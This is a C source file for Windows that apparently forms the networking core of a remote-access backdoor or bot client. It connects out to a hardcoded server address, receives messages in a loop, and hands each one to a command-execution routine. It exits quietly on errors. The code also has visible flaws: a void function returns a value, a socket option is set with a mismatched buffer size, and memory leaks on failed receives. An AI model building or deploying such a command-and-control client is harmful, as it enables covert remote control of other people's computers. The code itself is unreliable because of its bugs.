#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"

SOCKET client;
SOCKADDR_IN serverInfo;
uint64 ioNonBlockMode = 1;
uint64 ioBlockMode = 0;

int net_SendData(char* msg, int len)
{
     int rv = send(client, msg, len, 0);
     NET_PROTECT_CPU();

     if(rv < 1)
     {
          return 0;
     }

     return rv;
}

int net_ReciveData(OUT_STRP msg)
{
     char *rbuff = malloc(NET_BUFFSIZE);
     memset(rbuff, 0, NET_BUFFSIZE);
     int rv = recv(client, rbuff, NET_BUFFSIZE, 0);
     NET_PROTECT_CPU();

     if(rv < 1)
     {
          return -1;
     }

     *msg = rbuff;

     return rv;
}

int net_checkConnection(SOCKET sock)
{
     char data;
     return recv(sock, &data, 1, MSG_PEEK);
}

void net_Prepare(void)
{
     WSADATA wsaData;

     if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
     {
          exit(0);
     }

     serverInfo.sin_addr.s_addr = inet_addr(NET_IP);
     serverInfo.sin_family = AF_INET;
	serverInfo.sin_port = htons(NET_PORT);
}

void net_shutdown(void)
{
	shutdown(client, SD_BOTH);
	closesocket(client);
}

void net_CreateSocket(void)
{
     client = socket(AF_INET, SOCK_STREAM, 0);
     char _val1[1] = { 1 };
     setsockopt(client, SOL_SOCKET, SO_REUSEADDR, _val1, sizeof(int));

     if(client == INVALID_SOCKET)
     {
          WSACleanup();
          exit(0);
	}
}

void net_Connect(void)
{
     if(connect(client, (struct sockaddr_in*)&serverInfo, sizeof(serverInfo)) < 0)
     {
          return -1;
     }

     ioctlsocket(client, FIONBIO, &ioNonBlockMode);

     FD_SET readFd;

     while(1)
     {
          FD_ZERO(&readFd);
          FD_SET(client, &readFd);

          if(select(0, &readFd, NULL, NULL, NULL) < 0)
          {
               continue;
          }

          if(FD_ISSET(client, &readFd))
          {
               uint8* rmsg;

               if(net_ReciveData(&rmsg) < 1)
               {
                    net_shutdown();
				
                    return;
			}
			
			if(rmsg[0] == 0x0)
			{
				continue;
			}else{
                    if(ioctlsocket(client, FIONBIO, &ioBlockMode) != 0)
                    {
                         return;
                    }

				if(net_ExecuteCmd(rmsg, strlen(rmsg)) < 1)
				{
					net_shutdown();

                         free(rmsg);
					return;
                    }
                    
                    if(ioctlsocket(client, FIONBIO, &ioNonBlockMode))
                    {
                         return;
                    }
			}

			free(rmsg);
		}
	}
}
